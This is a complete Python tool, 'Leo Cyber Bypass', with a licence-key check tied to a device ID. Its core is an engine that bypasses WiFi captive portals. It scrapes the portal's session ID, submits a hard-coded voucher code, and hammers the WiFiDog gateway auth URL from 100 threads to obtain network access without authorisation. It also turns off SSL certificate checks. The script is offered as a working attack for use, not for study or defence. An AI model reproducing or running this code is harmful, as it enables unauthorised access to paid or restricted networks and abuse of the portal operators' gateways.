#!/usr/bin/env python3
# Leo Cyber Bypass - Professional Edition (Tech Competition)
# Stable | Clean | Error-Free

import requests, re, urllib3, time, threading, os, hashlib, ssl, json, sys
import subprocess
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime

# ==================== SIMPLE COLOR (NO UNICODE ISSUES) ====================
class Colors:
    RESET = "\033[0m"
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    BLUE = "\033[34m"
    CYAN = "\033[36m"
    WHITE = "\033[37m"
    BOLD = "\033[1m"

# Windows compatibility
if os.name == 'nt':
    os.system('color')

c = Colors()
reset = c.RESET

def p_green(text): print(f"{c.GREEN}{text}{c.RESET}")
def p_cyan(text): print(f"{c.CYAN}{text}{c.RESET}")
def p_yellow(text): print(f"{c.YELLOW}{text}{c.RESET}")
def p_blue(text): print(f"{c.BLUE}{text}{c.RESET}")
def p_white(text): print(f"{c.WHITE}{text}{c.RESET}")

# ==================== SSL BYPASS ====================
try:
    _create_unverified_https_context = ssl._create_unverified_context
except AttributeError:
    pass
else:
    ssl._create_default_https_context = _create_unverified_https_context
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==================== CONFIG ====================
KEY_URL = "https://raw.githubusercontent.com/paingkhant2701199/Cyber/main/Leo_Cyber.txt"
LICENSE_FILE = ".leo_license.dat"
REVOKE_CHECK_INTERVAL = 60

# ==================== DEVICE ID ====================
def get_hwid():
    storage = ".device_id"
    if os.path.exists(storage):
        with open(storage, 'r') as f:
            return f.read().strip()
    
    try:
        serial = subprocess.check_output("getprop ro.serialno", shell=True, stderr=subprocess.DEVNULL).decode().strip()
        if not serial or serial == "unknown":
            serial = subprocess.check_output("settings get secure android_id", shell=True, stderr=subprocess.DEVNULL).decode().strip()
        if not serial:
            import uuid
            serial = str(uuid.getnode())
        hwid = hashlib.md5(serial.encode()).hexdigest()[:12].upper()
    except:
        hwid = hashlib.md5(str(os.getpid()).encode()).hexdigest()[:12].upper()
    
    with open(storage, 'w') as f:
        f.write(hwid)
    return hwid

# ==================== LICENSE ====================
def save_license(hwid, key, expiry):
    with open(LICENSE_FILE, 'w') as f:
        json.dump({"id": hwid, "key": key, "expiry": expiry}, f)

def load_license():
    if os.path.exists(LICENSE_FILE):
        try:
            with open(LICENSE_FILE, 'r') as f:
                return json.load(f)
        except:
            return None
    return None

def delete_license():
    if os.path.exists(LICENSE_FILE):
        os.remove(LICENSE_FILE)

# ==================== NETWORK ====================
def is_online():
    try:
        r = requests.get("http://www.google.com/generate_204", timeout=3)
        return r.status_code == 204
    except:
        return False

# ==================== ONLINE VERIFICATION ====================
def verify_online(hwid, key):
    try:
        resp = requests.get(KEY_URL, timeout=10, verify=False).text
        for line in resp.splitlines():
            if '|' in line:
                parts = line.split('|')
                if len(parts) == 3:
                    db_id, db_key, db_exp = parts
                    if db_id.strip() == hwid and db_key.strip() == key:
                        exp_date = datetime.strptime(db_exp.strip(), "%d-%m-%Y")
                        if datetime.now() < exp_date:
                            return True, db_exp.strip()
                        else:
                            return False, "EXPIRED"
        return False, "NOT_FOUND"
    except:
        return None, None

# ==================== CLEAN BANNER ====================
def show_banner():
    os.system('clear' if os.name != 'nt' else 'cls')
    print()
    p_cyan("=" * 55)
    print(f"{c.WHITE}     LEO CYBER BYPASS SYSTEM v2.0{c.RESET}")
    print(f"{c.YELLOW}     Professional Edition{c.RESET}")
    p_cyan("=" * 55)
    print()

# ==================== LICENSE CHECK ====================
def authenticate():
    hwid = get_hwid()
    show_banner()
    
    local = load_license()
    
    # First time activation
    if not local or local.get('id') != hwid:
        p_white(f"Device ID: {hwid}")
        user_key = input(f"{c.CYAN}[?] Enter license key: {c.RESET}").strip()
        
        p_yellow("[*] Verifying...")
        
        valid, expiry = verify_online(hwid, user_key)
        
        if valid is True:
            save_license(hwid, user_key, expiry)
            p_green("[+] License activated successfully!")
            p_green(f"[+] Expires: {expiry}")
            time.sleep(2)
            return True
        elif valid is False:
            p_white("[-] Invalid or expired license key.")
            return False
        else:
            p_yellow("[!] Cannot verify online. Please check connection.")
            return False
    
    # Existing license - check revocation when online
    if is_online():
        p_yellow("[*] Checking license status...")
        status, expiry = verify_online(hwid, local.get('key', ''))
        
        if status is False:
            p_white("[-] License has been revoked or expired.")
            delete_license()
            return False
        elif status is True:
            if expiry and expiry != local.get('expiry'):
                save_license(hwid, local.get('key'), expiry)
                p_green(f"[+] License updated: {expiry}")
            p_green("[+] License valid")
            time.sleep(1)
            return True
    
    # Offline mode - use cached
    p_yellow("[*] Offline mode - using cached license")
    time.sleep(1)
    return True

# ==================== BYPASS ENGINE ====================
class BypassCore:
    def __init__(self):
        self.active = True
        self.session = None
    
    def pulse(self, url):
        headers = {'User-Agent': 'Mozilla/5.0', 'Connection': 'keep-alive'}
        while self.active:
            try:
                requests.get(url, timeout=2, verify=False, headers=headers)
                time.sleep(0.02)
            except:
                time.sleep(0.5)
    
    def run(self):
        p_cyan("[*] Initializing bypass engine...")
        time.sleep(1)
        
        while self.active:
            try:
                # Check captive portal
                r = requests.get("http://connectivitycheck.gstatic.com/generate_204", 
                                allow_redirects=True, timeout=5)
                
                portal_url = r.url
                if portal_url == "http://connectivitycheck.gstatic.com/generate_204":
                    # Already connected
                    time.sleep(10)
                    continue
                
                sess = requests.Session()
                sess.verify = False
                
                # Get portal page
                resp = sess.get(portal_url, timeout=5)
                
                # Extract session ID
                sid_match = re.search(r'sessionId[=:][\s]*["\']?([a-fA-F0-9-]+)', resp.text)
                if not sid_match:
                    time.sleep(3)
                    continue
                
                sid = sid_match.group(1)
                p_green(f"[+] Session captured: {sid[:16]}...")
                
                # Try voucher bypass
                host = f"{urlparse(portal_url).scheme}://{urlparse(portal_url).netloc}"
                try:
                    sess.post(f"{host}/api/auth/voucher/",
                             json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1},
                             timeout=3)
                except:
                    pass
                
                # Get gateway info
                gw = parse_qs(urlparse(portal_url).query).get('gw_address', ['192.168.60.1'])[0]
                port = parse_qs(urlparse(portal_url).query).get('gw_port', ['2060'])[0]
                auth_url = f"http://{gw}:{port}/wifidog/auth?token={sid}"
                
                p_yellow("[*] Launching threads...")
                
                # Start pulse threads
                for _ in range(100):
                    threading.Thread(target=self.pulse, args=(auth_url,), daemon=True).start()
                
                p_green("[+] Bypass active!")
                
                # Monitor connection
                fail_count = 0
                while self.active:
                    if not is_online():
                        fail_count += 1
                        if fail_count >= 3:
                            p_yellow("[!] Reconnecting...")
                            break
                    else:
                        fail_count = 0
                    time.sleep(5)
                    
            except Exception:
                time.sleep(2)
                continue

# ==================== MAIN ====================
def main():
    if not authenticate():
        p_white("[-] Authentication failed.")
        time.sleep(3)
        return
    
    engine = BypassCore()
    
    # Background revocation checker
    def revoke_checker():
        hwid = get_hwid()
        while engine.active:
            time.sleep(REVOKE_CHECK_INTERVAL)
            if is_online():
                local = load_license()
                if local:
                    status, _ = verify_online(hwid, local.get('key', ''))
                    if status is False:
                        p_white("\n[-] License revoked remotely.")
                        delete_license()
                        engine.active = False
                        os._exit(0)
    
    threading.Thread(target=revoke_checker, daemon=True).start()
    
    try:
        engine.run()
    except KeyboardInterrupt:
        engine.active = False
        p_white("\n[+] Shutting down...")

if __name__ == "__main__":
    main()